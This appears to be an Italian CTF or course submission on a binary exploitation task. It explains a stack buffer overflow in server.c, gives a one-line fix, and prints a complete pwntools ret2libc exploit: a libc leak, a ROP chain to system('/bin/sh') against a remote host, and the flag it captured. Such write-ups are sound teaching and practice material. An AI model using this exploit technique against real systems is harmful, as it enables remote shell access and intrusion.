# Versari submission

## BUG

All'interno della funzione `child` riga `server.c:66`:

```cpp
#define MAX_ARG 8
#define MAX_CMD 56

struct cmd {
	void (*f)(struct cmd *c);
	char arg[MAX_ARG];
};
// ...
read(0, c.arg, MAX_CMD);
```

è presente un buffer overflow in quanto viene eseguita una read di `MAX_CMD` (56) bytes su `c.arg`,  buffer di dimensione `MAX_ARG` (8) bytes.

## FIX

Per sistemare il bug è sufficiente sostituire `MAX_CMD` con `MAX_ARG`.

## EXPLOIT

usage: `./exploit.py REMOTE`

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'server')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('131.114.51.56', 4000)
    else:
        return remote('localhost', 10_000)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

# receive the printf_leak
printf_leak = io.recvline()
printf_leak = printf_leak.split(b' ')[1].strip(b'\n')
printf_leak = int(printf_leak, 16)
libc.address = printf_leak - libc.sym['printf']

print('hex(libc.address)', hex(libc.address))

# io.send(b'g')
# io.send(cyclic(500))
# 'iaaajaaa' => offset = 32

pop_rdi = 0x00401963
nop = 0x00401984

# I would like to use this as payload
#
# payload = flat({
#     32 : [
#         pop_rdi,
#         next(libc.search(b'/bin/sh\x00')),
#         nop,
#         libc.sym['system']
#     ]
# })
# because without the NOP gadget the system function fails at 
#  ► 0x7e7d4904e8d3    movaps xmmword ptr [rsp + 0x50], xmm0
# but I have space only for 3 gadgets

# SOLUTION
# 
# follow the system flow and jump directly after a push
#    0x7e7d4904ebf7 <system+7>               je     system+16                <system+16>
#    ↓
#    0x7e7d4904e780                          push   r13
#    0x7e7d4904e782                          mov    edx, 1                  <- fake_system


fake_system = libc.address + 0x4e782
print('fake_system', hex(fake_system))

payload = flat({
    32 : [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        fake_system,
    ]
})

print('len(payload)', len(payload))

io.send(b'g')
io.sendline(payload)

io.interactive()

# commands:
# ls
# cat flag.txt => SNH{e7370faa51b0bf3faa4a1e6ffed0cbef}
```
